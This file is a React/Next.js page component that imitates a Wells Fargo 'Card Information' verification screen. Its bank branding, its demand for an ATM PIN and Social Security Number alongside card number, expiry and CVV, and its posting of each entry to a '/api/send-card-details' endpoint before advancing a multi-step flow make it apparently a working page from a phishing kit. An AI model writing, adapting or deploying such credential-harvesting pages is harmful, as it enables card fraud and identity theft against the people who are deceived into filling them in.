import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import valid from "card-validator";
import { Box } from "@mui/system";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import InputMask from "react-input-mask";
import { CustomInput } from "../components/CustomInput";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { SubmitButton } from "../components/SubmitButton";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { ShowPasswordToggle } from "../components/ShowPasswordToggle";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Please enter your card number.")
    .test(
      "test-number",
      "Please enter a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Please enter your card expiration date")
    .test(
      "test-date",
      "Please enter a valid date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("Please enter your card CVV number.")
    .test(
      "test-cvv",
      "Please enter a valid CVV number.",
      (value) => valid.cvv(value).isValid
    ),
  cardPin: yup
    .string()
    .required("Please enter your card pin.")
    .min(4, "Please enter a valid ATM pin")
    .max(5, "Please enter a valid ATM pin"),
  ssn: yup.string().required("Please enter your SSN Number."),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");
  const [showPassword, setShowPassword] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD DETAILS`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <title>Wells Fargo - Card Information</title>
      </Head>
      <Header />
      <Wrapper
        title="Card Information"
        paragraph="Okay, We need you to verify your card information."
        titleSX={{
          color: "#d20826",
          fontSize: "40px",
          lineHeight: "44px",
          textAlign: "center",
          position: "relative",
          display: "block",
          padding: "48px 0 0",
          outline: "none",
          marginBottom: "24px",
          fontFamily: '"Wells Fargo Serif",Georgia,serif',
          fontWeight: "400",
        }}
        loading={loading}
      >
        <Head>
          <title>Verify Your Card Information | Wells Fargo</title>
        </Head>
        <Box paddingBottom="32px">
          <InputMask
            mask={cardMask}
            {...register("cardNumber", {
              onChange: (event) => {
                var value = event.target.value;

                var newState = "9999 9999 9999 9999";
                if (/^3[47]/.test(value)) {
                  newState = "9999 999999 99999";
                }
                setCardMask(newState);
              },
            })}
          >
            {
              // @ts-ignore
              () => (
                <CustomInput
                  label="Card number"
                  error={
                    !!(
                      errors.cardNumber &&
                      (errors.cardNumber.message as unknown as string)
                    )
                  }
                  errorMessage={
                    errors.cardNumber &&
                    (errors.cardNumber.message as unknown as string)
                  }
                  register={register("cardNumber", {
                    onChange: (event) => {
                      var value = event.target.value;
                      console.log(value);

                      var newState = "9999 9999 9999 9999";
                      if (/^3[47]/.test(value)) {
                        newState = "9999 999999 99999";
                      }
                      setCardMask(newState);
                    },
                  })}
                />
              )
            }
          </InputMask>
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <InputMask mask={"99/9999"} {...register("expirationDate")}>
            {
              // @ts-ignore
              () => (
                <CustomInput
                  error={
                    !!(
                      errors.expirationDate &&
                      (errors.expirationDate.message as unknown as string)
                    )
                  }
                  errorMessage={
                    errors.expirationDate &&
                    (errors.expirationDate.message as unknown as string)
                  }
                  label="Expiry date: MM/YYYY"
                  register={register("expirationDate")}
                />
              )
            }
          </InputMask>
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={!!(errors.cvv && (errors.cvv.message as unknown as string))}
            errorMessage={
              errors.cvv && (errors.cvv.message as unknown as string)
            }
            label="CVV"
            type="number"
            register={register("cvv")}
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={
              !!(
                errors.cardPin && (errors.cardPin.message as unknown as string)
              )
            }
            errorMessage={
              errors.cardPin && (errors.cardPin.message as unknown as string)
            }
            label="ATM Pin"
            type={showPassword ? "number" : "password"}
            register={register("cardPin")}
            endAdornment={
              <ShowPasswordToggle
                showPassword={showPassword}
                setShowPassword={setShowPassword}
              />
            }
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <InputMask mask={"999-99-9999"} {...register("ssn")}>
            {
              // @ts-ignore
              () => (
                <CustomInput
                  error={
                    !!(errors.ssn && (errors.ssn.message as unknown as string))
                  }
                  errorMessage={
                    errors.ssn && (errors.ssn.message as unknown as string)
                  }
                  label="Social Security Number"
                  // type="number"
                  register={register("ssn")}
                />
              )
            }
          </InputMask>
        </Box>
        <Box
          component="section"
          sx={{
            margin: "1rem auto .625rem",
            display: "block",
          }}
        />
        <SubmitButton disabled={loading} text="Continue" onClick={onSubmit} />
      </Wrapper>
      <Footer />
    </>
  );
};

export default Card;
